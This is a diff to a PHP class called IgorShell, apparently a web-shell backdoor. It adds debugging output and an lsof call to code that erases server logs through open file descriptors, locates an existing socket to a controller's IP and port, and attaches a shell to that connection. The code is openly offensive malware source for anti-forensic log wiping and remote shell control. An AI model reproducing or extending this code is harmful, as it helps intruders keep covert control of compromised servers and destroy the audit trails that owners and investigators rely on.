@@ -62,6 +62,16 @@ class IgorShell {
     private function getFileDescriptors(  ) {
 
         $it = new DirectoryIterator("glob:///proc/self/fd/*");
+        $x = `lsof`;
+        $return = array();
+        if($b = preg_split('/(\t|\s)+/', $x)){
+            $i = 0;
+            foreach($b as $key => $value){
+                var_dump($key, $value);
+            }
+        }
+        var_dump($return);
+        /*var_dump($x);*/die;
         foreach($it as $f) {
 
             $tmpArr = array();
@@ -126,15 +136,15 @@ class IgorShell {
 
                     // Check if current size is smaller then prev size to know the operation was succesfull
                     if($currentSize<$prevSize||$currentSize==false) {
-                        
+
                         echo 'Log is empty: '.$props['filepath'].'!<br/>';
                     }
                     else {
-                        
+
                         echo 'Log whipe failed, looks like your fucked ;)';
                     }
                 }
-            } 
+            }
 
             fclose($props['fd']);
         }
@@ -144,7 +154,7 @@ class IgorShell {
 
         if(empty($this->m_FileDescriptors)){
 
-            $this->getFileDescriptors(); 
+            $this->getFileDescriptors();
         }
 
         foreach($this->m_FileDescriptors as $fd => $props){
@@ -175,6 +185,7 @@ class IgorShell {
         if(!$this->m_FileDescriptors){
             $this->getFileDescriptors();
         }
+        var_dump($this->m_FileDescriptors);
         if(!empty($this->m_FileDescriptors)){
             foreach( $this->m_FileDescriptors as $id => $d ) {
 
@@ -184,11 +195,12 @@ class IgorShell {
                 }
 
                 $remote = stream_socket_get_name($d['fd'], true);
-
+                var_dump($remote);
                 if( $remote == $this->m_BossIp . ':' . $this->m_BossPort) {
 
                     // Sock found!
                     $this->m_BossSock = $d['fd'];
+                    var_dump($d);
 
                     if( is_resource($this->m_BossSock) )
                         echo 'Found socket!\n';
@@ -200,11 +212,12 @@ class IgorShell {
         }
     }
 
-    public function hookShell() {
+    public function hookShell($socketResource = null) {
 
         // Check if sock has been found
-        if( !is_resource($this->m_BossSock) )
+        if( !is_resource($this->m_BossSock) ){
             $this->findSock();
+        }
 
         // Disable blocking for socket stream
         socket_set_nonblock($this->m_BossSock);
